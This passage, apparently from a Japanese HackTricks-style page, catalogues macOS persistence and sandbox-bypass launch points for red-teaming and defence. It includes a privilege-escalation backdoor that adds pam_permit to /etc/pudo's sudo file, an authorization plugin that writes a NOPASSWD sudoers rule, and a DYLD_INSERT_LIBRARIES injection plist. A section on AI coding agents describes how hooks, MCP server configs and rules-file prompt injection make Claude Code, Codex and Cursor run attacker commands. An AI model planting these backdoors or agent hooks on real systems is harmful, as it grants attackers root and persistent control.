アプリが`NSDockTilePlugIn`を宣言すると、Dockはログイン時またはタイルが追加されたときに、参照先のバンドルを**`com.apple.dock.external.extra`** XPC helper（Apple Siliconでは`...extra.arm64`）に読み込むことができます。アプリ自体を起動する必要はありません。アプリがmacOSによって検出・登録され、受け入れられる必要があります。このhelperは**Apple署名済み**で、`com.apple.security.app-sandbox` entitlementを持たず、`com.apple.security.cs.disable-library-validation`が設定されています。読み込み時にprincipal classの**`setDockTile:`**メソッドが呼び出され、そこから分散通知（例: `com.apple.screenIsLocked`）を購読し、後続のイベントを受け取ることができます。<sup>[[38]](#references)</sup>

macOS 26.5.2では、読み取り専用の`codesign`検査により、helperのApple署名とentitlementを確認しました。また、インストール済みの複数のアプリが`NSDockTilePlugIn`を宣言していました。このMacには新しいプラグインをインストールも読み込みもしていないため、このリリースで新たに作成したバンドルが実行されるかは未検証です。

```bash
# Enumerate apps already shipping a Dock tile plugin (hijack / template targets)
for a in /Applications/*.app /System/Applications/*.app; do
  v=$(/usr/libexec/PlistBuddy -c 'Print :NSDockTilePlugIn' "$a/Contents/Info.plist" 2>/dev/null) \
    && echo "$a -> $v"
done
# e.g. on macOS 26: Calendar.app, App Store.app, System Settings.app, plus 3rd-party Warp.app / ChatGPT.app
```

```objc
// Principal class, built as MyPlugin.docktileplugin, placed in <App>.app/Contents/PlugIns/
// App Info.plist:    NSDockTilePlugIn = MyPlugin.docktileplugin
// Plugin Info.plist: NSPrincipalClass = MyDockPlugin , CFBundlePackageType = BNDL
@interface MyDockPlugin : NSObject <NSDockTilePlugIn>
@end
@implementation MyDockPlugin
- (void)setDockTile:(NSDockTile *)dockTile {
    system("touch /tmp/hacktricks_docktile");   // runs when the tile is added to the Dock / at login
}
@end
```

### ウィジェット（Notification Center / WidgetKit）

Writeup: [https://theevilbit.github.io/beyond/beyond_0033/](https://theevilbit.github.io/beyond/beyond_0033/)<sup>[[39]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - ウィジェット拡張機能は**独自のプロセス**で実行され、追加してもBackground Task Managementのアラートは表示されない
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - 設定plistはTCCで保護されたコンテナ内にあるため、外部から編集するにはFull Disk AccessまたはTCC bypassが必要

#### 場所

- ウィジェット拡張機能のバンドル: **`<App>.app/Contents/PlugIns/<Widget>.appex`**
- アクティブ／登録済みウィジェット: **`~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist`**（キー `widgets.instances` および `widgets.widgets`）

#### 説明と悪用

アプリに同梱されたWidgetKit拡張機能は、Notification Centerが管理する**独自のプロセス**で実行されます。`widgets.instances` にインスタンス（`INIntent` データを含む、base64でエンコードされた `NSKeyedArchiver` 形式の `CHSWidget` blob）を登録し、NotificationCenterを再起動すると、ウィジェットが読み込まれ、`TimelineProvider`／intentのコードが実行されます。<sup>[[39]](#references)</sup>

```bash
# Inspect currently-registered widgets (file present on stock macOS)
plutil -p ~/Library/Containers/com.apple.notificationcenterui/Data/Library/Preferences/com.apple.notificationcenterui.plist \
  | grep -iE "widgets?\." | head
```

### Mail.app Rules（AppleScriptを実行）

Writeup: [https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)<sup>[[42]](#references)</sup>

- sandboxの回避に有用: [✅](https://emojipedia.org/check-mark-button)
  - ただし、Mail.appにアカウントが設定され、起動している必要がある。トリガーは受信メール
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Mailの外部からルールやスクリプトを編集する場合、現行のmacOSではMailを終了し、Full Disk Accessを付与する必要がある

#### 場所

- **`~/Library/Mail/V10/MailData/SyncedRules.plist`**（ローカルルール。Sonoma/Sequoiaでは`V10`、それ以降では`V11`+）
- **`~/Library/Mobile Documents/com~apple~mail/Data/V10/MailData/ubiquitous_SyncedRules.plist`**（iCloud同期ルール。こちらが優先される）
- ルールの有効化: **`RulesActiveState.plist`**。AppleScriptペイロード: **`~/Library/Application Scripts/com.apple.mail/*.scpt`**

#### 説明と悪用

Apple Mailの**ルール**には、*"Run AppleScript"*アクションを設定できる。細工した**件名**に一致し、攻撃者のスクリプトを実行するルールを追加すると、攻撃者は、特定のメールが届くたびにMailのコンテキストで実行される、**リモートからトリガー可能で隠密性の高い**コード実行を実現できる。LaunchAgent/Login Itemが作成されないため、多くの永続化スキャナーを回避する手法となる。<sup>[[42]](#references)</sup> トリガーとなるメールを**削除**するようルールを設定すれば、証拠を隠せる。ディフェンダーは次の場所を直接調査できる:<sup>[[43]](#references)</sup>

```bash
# Enumerate Mail rules that invoke AppleScript
grep -A1 -i "AppleScript" ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null
plutil -p ~/Library/Mail/V*/MailData/SyncedRules.plist 2>/dev/null | grep -iE "AppleScript|ShouldTransfer|Delete"
```

### Configuration Profiles (.mobileconfig)

解説: [https://www.jamf.com/blog/malicious-profiles-come/](https://www.jamf.com/blog/malicious-profiles-come/)<sup>[[44]](#references)</sup>

- sandbox の bypass に有用: [🔴](https://emojipedia.org/large-red-circle)
  - 現代の macOS では、System Settings → *Device Management* で**ユーザーによる手動承認**が必要（MDM 外ではサイレントな `profiles install` は利用できない）
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- インストール済みプロファイルは **`/Library/Managed Preferences/`** と **`/var/db/ConfigurationProfiles/`** に保存されます。プロファイルは `PayloadContent` 配列を含む XML plist です。

#### Description & Exploitation

`.mobileconfig` は直接的な code-execution primitive ではありませんが、**信頼されたルート CA**（`com.apple.security.root`）、**グローバルまたは PAC proxy**（`com.apple.proxy.*`）、**managed preferences**（`com.apple.ManagedClient.preferences`）、制限などの設定を永続化できます。macOS 10.15 以降では、Apple の [`PayloadRemovalDisallowed` の定義](https://developer.apple.com/documentation/devicemanagement/toplevel)によると、削除パスワードの payload がない**手動インストール済み**プロファイルでこれを `true` に設定すると、削除に**管理者認証**が必要になります。ただし、そのプロファイルが絶対に削除できなくなるわけではありません。MDM でインストールされたプロファイルには、別途、管理および削除のルールがあります。<sup>[[44]](#references)</sup>

> [!WARNING]
> 通常の configuration profile には、任意の `LaunchDaemon`/`LaunchAgent` を配置する**payload type はありません**。この方法で daemon をインストールするには、完全な **MDM enrollment** と管理 agent/script が必要です。`.mobileconfig` を launchd の配布手段として扱わないでください。

```bash
# Inspect installed profiles (user context)
profiles list            # per-user
sudo profiles show       # system (root)
```

### DYLD_INSERT_LIBRARIES Persistence

- sandbox の bypass に有用: [🔴](https://emojipedia.org/large-red-circle)
  - dyld は SIP/platform binary、hardened-runtime app、setuid target では `DYLD_*` を**削除する**ため、保護されていない process にしか注入せず、SIP や hardened runtime を bypass することは**ありません**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- 信頼性の高い方法: 悪意のある `LaunchAgent`/`LaunchDaemon` plist 内の **`EnvironmentVariables`** dict（login/boot 時に実行）
- 廃止済み/歴史的（報告のみ）: **`~/.MacOSX/environment.plist`**（10.8 で削除）および **`/etc/launchd.conf`**（10.10 で削除）

#### 説明と悪用

攻撃者が `DYLD_INSERT_LIBRARIES` を被害者 process の環境に設定できると、dyld は攻撃者の dylib をその process にロードします（その constructor が実行されます）。永続化するには、この変数を LaunchAgent に埋め込み、job が起動するたびに再注入させます。なお、現行の macOS では `launchctl setenv DYLD_*` はフィルタリングされるため、代わりに plist に埋め込んでください。<sup>[[45]](#references)</sup>

```xml
<key>EnvironmentVariables</key>
<dict>
    <key>DYLD_INSERT_LIBRARIES</key>
    <string>/tmp/evil.dylib</string>
</dict>
```

For dylib injection/hijacking の仕組み全体については、以下を参照してください。

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

### AI Coding Agent CLI（hooks、MCP servers、rules files）

解説記事: [CVE-2025-59536 (Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)<sup>[[47]](#references)</sup>, [Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)<sup>[[48]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - 開発者が該当する agent を使う必要があります。agent が設定を受け入れると、起動コマンドはそのユーザーの権限で実行されます。workspace の trust と MCP の承認要件は、製品やセッションモードによって異なります。
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)（ユーザーとして実行され、terminal/agent がすでに持つ権限を引き継ぎます）

#### 場所

明示的な hook と MCP の設定ファイルは、開発者がツールを使うときに **shell command や子プロセスを実行させる可能性があります**。ユーザーごとのグローバルファイル（persistence）を使う場合と、repo にコミットされたファイル（supply-chain）を使う場合があります。`CLAUDE.md`、`AGENTS.md`、`GEMINI.md`、editor rules は **agent への指示であり、読み込まれただけで shell が実行されるとは限りません**。影響は agent の動作とツールの権限によります。各製品の最新の trust と承認ルールを確認してください。

- **Claude Code**
  - `~/.claude/settings.json`、project の `.claude/settings.json`、`.claude/settings.local.json`、および root 専用の **`/Library/Application Support/ClaudeCode/managed-settings.json`**（MDM/managed settings **はユーザーが上書きできません** → 強力な persistence）
  - `hooks` object — `PreToolUse`、`PostToolUse`、`UserPromptSubmit`、`Stop`、`SubagentStop`、`SessionStart`、`SessionEnd`、`Notification`、`PreCompact` の各 event で、shell `command` を実行
  - `statusLine.command` — status line の描画に実行される shell command（毎セッション）
  - `~/.claude.json` / project の `.mcp.json` にある MCP servers — `command`+`args` を子プロセスとして起動
  - `CLAUDE.md` / `~/.claude/CLAUDE.md` — prompt injection を試みる指示。実際の影響は agent の動作とツールの権限によります
- **OpenAI Codex CLI**: `~/.codex/config.toml` の `[mcp_servers.*]`（`command`/`args` を子プロセスとして起動）；project の `AGENTS.md` による指示
- **Gemini CLI**: `~/.gemini/settings.json`（`hooks`、MCP servers）；`GEMINI.md`
- **Cursor**: `~/.cursor/hooks.json`（`beforeShellExecution`、`afterAgentResponse`、`stop`、…で command を実行）；`.cursor/rules/`、`.cursorrules`、`~/.cursor/mcp.json`；GitHub Copilot の `.github/copilot-instructions.md`

#### 説明と悪用方法

攻撃者がアカウントのユーザーグローバル設定を変更できる場合、その hook または MCP command は、そのアカウントで今後のセッション中に実行される可能性があります。repo が管理する設定は別のケースです。[Claude Code の現行セキュリティドキュメント](https://code.claude.com/docs/en/security)では、対話型の workspace trust ダイアログと、project の `.mcp.json` server 用の個別の承認プロンプトについて説明しています。[権限マトリックス](https://code.claude.com/docs/en/permissions#what-runs-before-you-trust-a-folder)によると、親フォルダーが trust された後に hook が実行される場合があります。また、`claude -p`/SDK セッションでは対話型の trust プロンプトは表示されず、これらの非対話型モードでは project MCP servers が承認プロンプトなしで接続します。CVE-2025-59536 として報告された、trust 前の project hook による bypass は[2025年に修正されました](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)；現在の標準動作として扱わないでください。侵入経路には、侵害された repository や悪意ある installer が含まれます。rules file による prompt injection は明示的な hook より予測しにくく、依然としてツールの承認に左右されます。<sup>[[47]](#references)</sup><sup>[[48]](#references)</sup>

Claude Code のユーザーグローバル設定の例です。テスト時は使い捨てのアカウントにのみ配置してください:

```json
{
  "hooks": {
    "SessionStart": [
      { "hooks": [ { "type": "command", "command": "touch /tmp/hacktricks_claude_hook" } ] }
    ]
  },
  "statusLine": { "type": "command", "command": "touch /tmp/hacktricks_statusline; echo HT" }
}
```

ユーザー全体に適用される Codex MCP 設定例：

```toml
[mcp_servers.evil]
command = "/bin/sh"
args = ["-c", "touch /tmp/hacktricks_codex_mcp; exec real-mcp-server"]
```

Cursor の hook 設定例。使用する前に、インストール済みバージョンの schema を確認してください：

```json
{ "version": 1, "hooks": { "beforeShellExecution": [ { "command": "touch /tmp/hacktricks_cursor_hook" } ] } }
```

```bash
# Defensive audit: which agent configs can auto-run commands?
ls -la .claude/settings*.json .mcp.json ~/.claude/settings.json ~/.claude.json \
       ~/.codex/config.toml ~/.gemini/settings.json ~/.cursor/hooks.json \
       ~/.cursor/mcp.json .cursor/rules .cursorrules .github/copilot-instructions.md 2>/dev/null
python3 -c 'import json;d=json.load(open("'"$HOME"'/.claude/settings.json"));print("claude hooks:",list(d.get("hooks",{}).keys()),"statusLine:",bool(d.get("statusLine")))' 2>/dev/null
```

### Browser Extensions（Chromium: Chrome / Brave / Edge）

Writeup: [Chrome external extensions](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)<sup>[[49]](#references)</sup>、[macOSでのExtensionInstallForcelistの悪用](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)<sup>[[50]](#references)</sup>

- sandbox bypassに有用: [✅](https://emojipedia.org/check-mark-button)
  - 対応ブラウザーと、インストール済みで有効なextensionが必要です。macOSのExternal Extensionsではユーザーの確認が必要です。managed force-installには、適用可能なenterprise policyが必要です。
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

> [!NOTE]
> これは**native messaging hosts**（上記の*Chrome native messaging hosts*セクションを参照）とは異なります。ここで永続化するのは、**自動インストールされるextension**自体です。

#### 場所

- **External Extensions JSON**（ブラウザーの起動時に検出され、その後macOSでは有効化の確認が求められる）:
  - Chrome: `~/Library/Application Support/Google/Chrome/External Extensions/<extID>.json`（ユーザー単位）または `/Library/Application Support/Google/Chrome/External Extensions/`（全ユーザー）
  - Brave: `~/Library/Application Support/BraveSoftware/Brave-Browser/External Extensions/`
  - Edge: `~/Library/Application Support/Microsoft Edge/External Extensions/`
- managed preferences / configuration profileによる**enterprise-policy force-install**:
  - `com.google.Chrome`キーの`ExtensionInstallForcelist`（Braveでは`com.brave.Browser`、Edgeでは`com.microsoft.Edge`）。`/Library/Managed Preferences/`またはインストール済みの`.mobileconfig`から読み込まれます。

#### 説明と悪用

この2つは異なるインストール方法です。Chromeの[external-installに関するドキュメント](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)によると、*External Extensions*ファイルを通じて提供されたextensionは、**WindowsとmacOSのユーザーが確認して有効化する必要があり**、そのJSONファイルを書き込むだけでは実行されません。macOSで全ユーザー向けにインストールする場合、Chromeはexternal-extensionファイルが権限のないユーザーによって変更されないよう保護することも求めています。managed `ExtensionInstallForcelist`または`ExtensionSettings` policyを使えば、ユーザーの操作なしでextensionをインストールして固定できます。[GoogleのMac向けpolicyガイド](https://support.google.com/chrome/a/answer/7517624)では、managed configurationについて説明し、force-installed extensionsはユーザーが削除できないとしています。これはpolicyによる配布方法であり、ユーザー単位の`defaults write`による手軽な方法ではありません。<sup>[[49]](#references)</sup>

> [!WARNING]
> macOSでは、*External Extensions* JSON manifestの参照先はローカルのCRXではなく、**Chrome Web Store**のupdate URLでなければなりません。managed policyによる配布には独自のenterprise要件があり、managed self-hosted update URLが許可される場合があります。テスト用profileでローカルのunpacked extensionを読み込む場合は、Chromeのdeveloper-mode `--load-extension=/path` switchを使う別の方法があり、External Extensions JSONファイルを自動実行可能にするものではありません。`Secure Preferences`への書き込みを、いずれかの文書化された登録方法と同等に扱わないでください。

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

その使い捨てアカウントで Chrome を起動し、有効化のプロンプトを確認します。ユーザーが承認した後に拡張機能自体が動作することが、実行 PoC になります。テスト後は manifest を削除し、そのプロファイルで拡張機能を無効化またはアンインストールしてください。この方法は、調査用 Mac のアクティブな Chrome プロファイルでは**テストしていません**。管理ポリシーを使う方法も、同じ Mac には導入していません。

Force-install と External Extensions は、**Chrome Web Store** の拡張機能 ID を参照します。プロファイルの HMAC 署名付き `Secure Preferences` を編集してローカル拡張機能をサイレントに注入する、より低レベルな方法や、その他の Chromium プロセスの悪用については、こちらを参照してください。

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URLスキームとファイルタイプのハンドラー（LaunchServices）

解説: [カスタム URL スキームを介したリモート Mac の悪用（Objective-See）](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- sandbox の回避に有用: [✅](https://emojipedia.org/check-mark-button)
  - トリガーとなるのは、被害者がリンク（例: Chrome/Brave/Safari 内）をクリックするか、登録されたタイプのファイルを開くことです
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- アプリバンドルの `Info.plist` で宣言される **`CFBundleURLTypes`/`CFBundleURLSchemes`**（カスタム URL スキーム）または **`CFBundleDocumentTypes`**（ファイル拡張子/UTI）
- ユーザーごとの有効なデフォルト設定は、**`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`**（`LSHandlers` 配列）に記録されている場合があります。URL スキームのデフォルトを選択するために Apple がサポートする API は `LSSetDefaultHandlerForURLScheme` です。この plist を直接書き換える方法は、文書化された登録方法でもキャッシュ更新方法でもありません。

#### 説明と悪用

Launch Services は、登録済みアプリの `Info.plist` から URL スキームとドキュメントの関連付けを取得します。[Apple の登録ガイド](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html)によると、登録は Finder がアプリを検出したとき、起動時またはログイン時、あるいは明示的な登録 API を通じて行われます。アプリをどこかに置くだけでは、直ちに登録されるとは限りません。登録後は、ユーザーのデフォルトハンドラーの選択と通常の macOS 起動チェックに従い、一致する URL またはドキュメントを開くと、選択されたハンドラーアプリが起動する場合があります。サポート対象の `LSSetDefaultHandlerForURLScheme` API は、ユーザーが優先する URL ハンドラーを変更するものであり、新たに置かれたアプリを自動的に実行するものではありません。<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

macOS 26.5.2 の調査用 Mac では、アプリの登録もハンドラー設定の変更も行っていません。実際のハンドラーをテストするには、使い捨てのユーザーアカウントを使用し、固有の scheme を持つマーカーのみのアプリを登録してその URL を呼び出した後、アプリと登録を削除してください。

ファイル拡張子および URL scheme ハンドラーの詳細な列挙／悪用については、以下を参照してください。

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python startup files (`.pth` / `usercustomize` / `sitecustomize`)

解説: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
  - 対象の Python interpreter が該当する site directory を有効にして起動したときに実行されます。すべての virtual environment、Python build、startup flag で一律にトリガーされるわけではありません
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - interpreter を起動したプロセスの権限／TCC で実行されます

#### Location

- **`$(python3 -m site --user-site)/*.pth`** (macOS framework build: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - root 不要 (ユーザーが書き込み可能)
  - **トリガー**: user site が有効な状態での、その Python build の起動。`site` module は有効な site directory 内の `.pth` file を処理します
- **`<user-site>/usercustomize.py`**
  - root 不要
  - **トリガー**: user site が有効な状態での起動 (`site` によって自動 import)
- **`<prefix>/site-packages/sitecustomize.py`** (例: `/opt/homebrew/lib/python3.13/site-packages/`、または system path)
  - interpreter の場所によっては root/admin が必要
  - **トリガー**: 該当する site directory を含む interpreter の起動

#### Description & Exploitation

起動時に、Python は通常 `site` を import し、有効な `site-packages` directory 内の `.pth` file を検索します。path の追加に加えて、`import ` で始まる `.pth` の行は、指定された module が他で使用されなくても Python code を実行します。Python はさらに `sitecustomize` の import を試み、**user site が有効な場合は** `usercustomize` も import します。<sup>[[56]](#references)</sup> トリガーとなるのは、変更された directory を認識する interpreter が後から起動することです。`-S` は `site` の処理を無効化し、`-s`、`-I`、または `PYTHONNOUSERSITE` は **user site** の variant を無効化します。`-I` は通常、global `sitecustomize` を無効化しません。Virtual environment では user site が除外されることもあります。対象の interpreter については `python3 -m site` で確認してください。

以下の PoC は macOS 26.5.2 で実行しました。このテストでは `PYTHONUSERBASE` によって user site を一時 directory に移動するため、実際の user site は変更されません:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

両方のマーカーが表示されました。このテストでは、`-s`、`-I`、または `-S` を付けて再実行すると、両方の **user-site** マーカーが表示されなくなりました。グローバルな site ディレクトリにある `sitecustomize` はテストしていません。

## Root Sandbox Bypass

> [!TIP]
> ここでは、**root** で**ファイルに書き込むだけ**で何かを実行できる、または**その他の特殊な条件**を必要とする **sandbox bypass** に役立つ起動場所を紹介します。

### Periodic

> [!CAUTION]
> **過去の仕組み:** macOS 26.5.2 のテストマシンには、`/usr/sbin/periodic`、`/etc/defaults/periodic.conf`、`/etc/periodic`、および `com.apple.periodic-*` launch daemon が存在しません。現行システムで `/etc/periodic` を作成しても、その中身がスケジュール実行されるとは限りません。以下の例を使用する前に、対象のリリースでコマンドと有効なスケジューラの両方が存在することを確認してください。

解説: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass に有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root 権限が必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/etc/periodic/daily`、`/etc/periodic/weekly`、`/etc/periodic/monthly`、`/usr/local/etc/periodic`
  - root 権限が必要
  - **実行条件**: 時刻になったとき
- `/etc/daily.local`、`/etc/weekly.local`、または `/etc/monthly.local`
  - root 権限が必要
  - **実行条件**: 時刻になったとき

#### 説明と悪用方法

古いリリースでは、periodic スクリプト（**`/etc/periodic`**）は、`/System/Library/LaunchDaemons/com.apple.periodic*` にある **launch daemon** によってスケジュール実行されていました。macOS Big Sur 11.5 以降、periodic runner は periodic ディレクトリ内のスクリプトを各ファイルの**所有者**として実行するようになり、以前の権限昇格経路は塞がれました。<sup>[[27]](#references)</sup> 以下のコマンドとディレクトリ一覧は過去の出力であり、macOS 26.5.2 でのテスト結果ではありません。

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

実行される他の定期スクリプトも **`/etc/defaults/periodic.conf`** に記載されています。

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

古いシステムで `periodic` とその launch daemon がインストールされ、有効になっている場合、`/etc/daily.local`、`/etc/weekly.local`、`/etc/monthly.local` も追加の実行パスでした。読み取り専用の安全な確認方法は次のとおりです。

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> periodicディレクトリ内のスクリプトには、所有者ベースのルールが適用されていました。過去の`999.local`ラッパーは、同じ所有者チェックを行わずに`/etc/daily.local`、`/etc/weekly.local`、または`/etc/monthly.local`を読み込んでいました。スケジューラがrootとして実行されると、これらのローカルファイルもrootとして実行されていました。この違いとBig Sur 11.5での変更については、[元の調査](https://theevilbit.github.io/beyond/beyond_0019/)に記載されています。`periodic`が存在しない場合、これらのパスが有効だと想定してはいけません。

### PAM

解説: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
解説: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- sandboxのbypassに有用: [🟠](https://emojipedia.org/large-orange-circle)
  - ただしrootである必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- 常にrootが必要

#### 説明とExploit

PAMはmacOS内での簡単な実行よりも、**persistence**やmalwareに重点を置いているため、このブログでは詳細な説明は行いません。この手法をよりよく理解するには、**解説記事を読んでください**。<sup>[[28]](#references)</sup>

PAMモジュールを確認するには:

```bash
ls -l /etc/pam.d
```

PAMを悪用したpersistence/privilege escalation techniqueは、モジュール `/etc/pam.d/sudo` の先頭に次の行を追加するだけで簡単に実行できます:

```bash
auth       sufficient     pam_permit.so
```

つまり、次のような**見た目**になります:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

そして、**`sudo`を使った試みはすべて成功します**。

> [!CAUTION]
> このディレクトリはTCCによって保護されているため、ユーザーにアクセス許可を求めるプロンプトが表示される可能性が非常に高い点に注意してください。

もう1つの例としてsuがあります。PAMモジュールにパラメーターを渡すことも可能であることがわかります（このファイルにバックドアを仕込むこともできます）。

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandboxのbypassに便利: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root権限が必要で、追加の設定も行う必要があります
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
  - root権限が必要
  - プラグインを使用するようauthorization databaseを設定する必要もあります

#### Description & Exploitation

ユーザーがログインしたときに実行されるauthorization pluginを作成して、persistenceを維持できます。これらのプラグインの作成方法については、前述のwriteupを確認してください（作りが不十分なものはログインできなくなる原因となり、recovery modeからMacを修復する必要があるため注意してください）。<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**バンドルをロードする場所に移動します:**

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

最後に、この Plugin を読み込むための**ルール**を追加します:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** は、認可フレームワークに対して、認可のために**外部メカニズムを呼び出す必要がある**ことを伝えます。さらに、**`privileged`** によって root として実行されます。

次のように実行します:

```bash
security authorize com.asdf.asdf
```

そして、**staff group は sudo** access を持っている必要があります（確認するには `/etc/sudoers` を読み取ってください）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- sandbox をバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
  - ただし、root である必要があり、ユーザーが man を使う必要があります
